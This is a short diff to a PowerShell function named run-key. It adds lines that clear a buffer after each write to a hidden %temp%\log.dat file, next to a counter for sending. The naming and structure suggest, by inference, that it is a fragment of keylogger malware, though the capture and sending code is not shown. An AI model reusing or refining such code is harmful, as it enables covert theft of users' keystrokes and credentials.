@@ -40,6 +40,7 @@ function run-key()
             {
               $counter = 0
               cmd.exe /c "echo $lista>>%temp%\log.dat"
+              $lista = ""
               $send++
               if ($send -ge 3)
               {
@@ -66,6 +67,7 @@ function run-key()
     if ($end -lt 5)
     {
       cmd.exe /c "echo $lista>>%temp%\log.dat"
+      $lista = ""
       run-key
     }
   }
